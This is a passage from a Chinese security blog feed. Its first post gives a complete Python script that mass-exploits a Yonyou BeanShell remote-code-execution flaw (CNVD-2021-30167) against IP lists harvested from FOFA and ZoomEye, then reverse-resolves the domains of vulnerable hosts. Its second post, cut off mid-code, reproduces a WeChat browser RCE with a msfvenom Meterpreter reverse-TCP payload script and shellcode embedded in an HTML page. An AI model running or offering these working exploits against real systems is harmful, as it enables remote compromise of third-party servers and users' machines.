    <content type="html"><![CDATA[<p>最近开始在漏洞盒子挖挖事件型的洞，一开始也是手动测试，这样做就会发现效率明显不高，还很耗费精力。所以就联想到，以前听说过大佬们，都会去写一些脚本自己去扫描测试，所以我也上手试了一下。说实话，用脚本去验证是否存在漏洞很高效，如果大家参加过CTF AWD模式就会知道，主要就是利用自动化脚本去批量攻击获取flag，然后批量上交，这方面来说和下面的自动化脚本时异曲同工之妙啊。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>声明：本文中的自动化脚本仅供学习和安全研究，禁止利用该工具非法攻击他人网站。本人不承担任何后果。</p></blockquote><h1 id="挖掘事件型漏洞的前期准备"><a href="#挖掘事件型漏洞的前期准备" class="headerlink" title="挖掘事件型漏洞的前期准备"></a>挖掘事件型漏洞的前期准备</h1><p>对于原创型漏洞我们需要做的更多是代码审计，而对于挖掘事件型漏洞那就需要我们提前准备一些工具或收集一些信息了。</p><ol><li>收集一些0Day或者NDay漏洞的EXP和POC</li><li>合理利用网络安全搜索引擎来收集信息，例如FOFA、360网络空间探测平台、ZoomEyes等等</li></ol><h2 id="收集EXP和POC"><a href="#收集EXP和POC" class="headerlink" title="收集EXP和POC"></a>收集EXP和POC</h2><p>关于EXP和POC的收集，这个就需要大家经常关注一些漏洞信息平台了，这样可以帮助我们去寻找一些新的漏洞，更是方便寻找漏洞编号，以便于我们寻找EXP和POC。</p><p>这里说几个我知道的漏洞信息共享平台：CNNVD国家信息安全漏洞库、安全客漏洞平台、seebug平台、美国国家信息安全漏洞库、国家工控漏洞库</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>CNNVD：<a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p><p>安全客：<a href="https://www.anquanke.com/vul">https://www.anquanke.com/vul</a></p><p>seebug：<a href="https://www.seebug.org/">https://www.seebug.org/</a></p><p>美国信安库：<a href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></p><p>国家工控漏洞库：<a href="http://ics.cnvd.org.cn/">http://ics.cnvd.org.cn/</a></p></blockquote><p>以上这些是漏洞库信息，找到一个漏洞，并且想要深入了解一下其如何利用，这时候就要多逛，攻防社区、安全媒体等，例如FREEBUF、安全客、嘶吼、奇安信攻防社区、先知社区等了</p><p>最后POC和EXP，通过上面的安全媒体和攻防社区，大多数的POC和EXP我们都可以获取，但是还是无法获取到POC或者EXP，那么就完全可以去Github上输入相应的漏洞编号进行搜索，很有可能是可以找到相应的EXP和POC的。</p><h2 id="网络空间安全搜索引擎利用"><a href="#网络空间安全搜索引擎利用" class="headerlink" title="网络空间安全搜索引擎利用"></a>网络空间安全搜索引擎利用</h2><p>对于前面的EXP和POC都准备好了，那么就需要来找一下相应的目标了，这个时候就可以考虑去使用网络空间安全搜索引擎来查找运行目标组件的设备了。</p><p>不同的网络安全搜索引擎语法略有不同，大家可以自行到相应网站了解，这里我主要用FOFA、ZoomEyes和360空间探测。使用相应语法可以搜索到运行目标组件的设备，这个时候就可以批量导出IP地址到本地，或者使用一些手法利用console来导出IP地址。这样就可以获得一个目标IP列表了，再结合我们的自动化脚本实现批量扫描。</p><h1 id="自动化脚本开发思路"><a href="#自动化脚本开发思路" class="headerlink" title="自动化脚本开发思路"></a>自动化脚本开发思路</h1><p>首先自动化脚本要实现的目的是什么？当然是要代替人去进行漏洞验证，所以我们需要去遍历IP URL列表，由脚本去逐一验证漏洞能否利用。</p><p>其次自动化脚本验证后，我们想要获得什么？当然是让脚本告诉我们哪些设备存在漏洞，以及漏洞地址。那么我们就可以由脚本生成一份漏洞URL列表给我们。</p><p>如果使用过FOFA等引擎就知道，我们一直访问的都是IP地址，而非使用域名进行访问，而提交漏洞最好还是要有一个域名，这也有利于找到服务器所属厂商。所以脚本还提供一个IP反查到域名的功能，并且在生成一份IP反查结果列表给我们。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210726170230.png" alt="image-20210726153421840"></p><p>但是这还不够，导出IP地址时，我们并不知道IP是否时之前已经验证过的了，所以还应该在漏洞验证模块之前加入一个过滤器，滤除重复项目，所以需要在建立一个已扫描IP URL列表，在开始漏洞验证前去除重复IP，提高工作效率。</p><h1 id="实施案例-CNVD-2021-30167"><a href="#实施案例-CNVD-2021-30167" class="headerlink" title="实施案例-CNVD-2021-30167"></a>实施案例-CNVD-2021-30167</h1><p>啥也不说，show you my code：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding='utf-8'</span><span class="token comment"># author: A1andNS</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> timevul_url <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"vul_url.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>ip_reverse_result <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ip_reverse_result.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_ip_finished</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ip_finish.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>    lines <span class="token operator">=</span> f2<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_finish_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip_finish_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span>    f2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ip_finish_list<span class="token keyword">def</span> <span class="token function">get_ip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ip.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token comment"># ip格式为 http://192.168.2.2:8090/</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#pattern = re.compile(r':[0-9]+')</span>        <span class="token comment">#if pattern.search(line):</span>        <span class="token comment">#line = line.replace("https", "http")</span>        ip_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ip_list<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>ips<span class="token punctuation">,</span>ipfs<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd <span class="token operator">=</span> <span class="token string">"whoami"</span>  <span class="token comment"># command</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'</span>    <span class="token punctuation">&#125;</span>    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"bsh.script"</span><span class="token punctuation">:</span> <span class="token string">'exec("'</span><span class="token operator">+</span>cmd<span class="token operator">+</span><span class="token string">'")'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>        <span class="token keyword">if</span> ip <span class="token keyword">not</span> <span class="token keyword">in</span> ipfs<span class="token punctuation">:</span>            url <span class="token operator">=</span> ip <span class="token operator">+</span> <span class="token string">"servlet/~ic/bsh.servlet.BshServlet"</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"抱歉，您请求的页面出错啦！"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" 失败"</span><span class="token punctuation">)</span>                    <span class="token keyword">pass</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    html <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>                    pre <span class="token operator">=</span> html<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"pre"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> pre<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>pre<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        vul_url<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>pre<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                url <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"https"</span><span class="token punctuation">,</span><span class="token string">"http"</span><span class="token punctuation">)</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token string">"抱歉，您请求的页面出错啦！"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" 失败"</span><span class="token punctuation">)</span>                        <span class="token keyword">pass</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        html <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>                        pre <span class="token operator">=</span> html<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"pre"</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> pre<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>pre<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                            vul_url<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>pre<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"无法访问"</span><span class="token punctuation">)</span>                    <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token operator">+</span><span class="token string">" 已测试的重复项"</span><span class="token punctuation">)</span>            <span class="token keyword">pass</span>    vul_url<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search_ip</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;'</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> pattern<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ip<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">get_ip_reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"vul_url.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        line_ls <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>        url <span class="token operator">=</span> line_ls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        ip <span class="token operator">=</span> search_ip<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> ip <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>            aizhan_reverse<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    ip_reverse_result<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">aizhan_reverse</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> ip <span class="token operator">+</span> <span class="token string">" =>"</span>    url <span class="token operator">=</span> <span class="token string">"https://dns.aizhan.com/"</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">"/"</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># print(url)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span>        <span class="token comment"># print(soup)</span>        td <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"td"</span><span class="token punctuation">,</span> attrs<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"class"</span> <span class="token punctuation">:</span><span class="token string">"domain"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> td<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>td<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> i<span class="token punctuation">.</span>a            result <span class="token operator">+=</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>        ip_reverse_result<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token operator">+</span><span class="token string">" 发生错误"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.8684.cn/ip"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    ip_ls <span class="token operator">=</span> get_ip<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_fls <span class="token operator">=</span> get_ip_finished<span class="token punctuation">(</span><span class="token punctuation">)</span>    poc<span class="token punctuation">(</span>ip_ls<span class="token punctuation">,</span>ip_fls<span class="token punctuation">)</span>    get_ip_reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># print(ip_fls)</span>    <span class="token comment"># test()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是我根据上面所写的开发思路的开发结果，一个自动化漏洞验证，并且IP反查域名的脚本，他的出现确实提高了不少效率啊。</p><p>执行结果如下：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210726164106.png" alt="image-20210726163713961"></p><p>这个脚本目前我已经放在我的一个github仓库上了，以后应该还会有其他的脚本被加入进去。</p><p>仓库地址：<a href="https://github.com/A1andNS/auto_vuln_test_script">https://github.com/A1andNS/auto_vuln_test_script</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近开始在漏洞盒子挖挖事件型的洞，一开始也是手动测试，这样做就会发现效率明显不高，还很耗费精力。所以就联想到，以前听说过大佬们，都会去写一些脚本自己去扫描测试，所以我也上手试了一下。说实话，用脚本去验证是否存在漏洞很高效，如果大家参加过CTF AWD模式就会知道，主要就是利</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="自动化" scheme="http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>WeChat RCE漏洞复现</title>
    <link href="http://yoursite.com/post/WeChat-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"/>
    <id>http://yoursite.com/post/WeChat-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html</id>
    <published>2021-07-17T15:45:22.000Z</published>
    <updated>2021-07-17T16:41:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>4月份有一个Chrome的RCE 0day闹得沸沸扬扬，吓得我是赶紧就升级到了最新的Chrome，但是其实低版本Chrome也并非就非常危险，因为chrome默认开启了sandbox功能的，所以说正常情况下漏洞也无法被利用。</p><p>紧接着Wechat RCE的消息传遍了大江南北，仔细一查看，好家伙Wechat的内置Browser是基于chromium内核的，而且居然还使用了–no-sanbox选项，关闭了其自带的沙箱功能，从而导致了这次的RCE漏洞，同理其他的产品要是使用了chromium内核同时又如同wechat一样关闭了sanbox功能，那么一样会存在RCE风险。</p><h1 id="Wechat-RCE漏洞复现"><a href="#Wechat-RCE漏洞复现" class="headerlink" title="Wechat RCE漏洞复现"></a>Wechat RCE漏洞复现</h1><p>下面开始复现，首先我们需要构造一个特制的web链接来让靶机访问。</p><p>shell文件生成脚本：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">arch</span><span class="token operator">=</span>x86<span class="token assign-left variable">format</span><span class="token operator">=</span>csharp<span class="token assign-left variable">platform</span><span class="token operator">=</span>windows<span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">443</span><span class="token assign-left variable">HOST</span><span class="token operator">=</span><span class="token number">192.168</span>.90.124<span class="token assign-left variable">out</span><span class="token operator">=</span>./wechatshell.txt<span class="token assign-left variable">paylaod</span><span class="token operator">=</span>windows/meterpreter/reverse_tcpmsfvenom -p <span class="token variable">$paylaod</span> -f <span class="token variable">$format</span> -a <span class="token variable">$arch</span> --platform <span class="token variable">$platform</span> -o <span class="token variable">$out</span> <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$HOST</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token variable">$PORT</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>./wechat_shell.sh</code>将生成的C#代码中的shell部分放入导index.html的shellcode中去。</p><p>index.html：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token constant">ENABLE_LOG</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token constant">IN_WORKER</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment">// run calc and hang in a loop</span><span class="token keyword">var</span> shellcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x8f</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe5</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x0c</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token 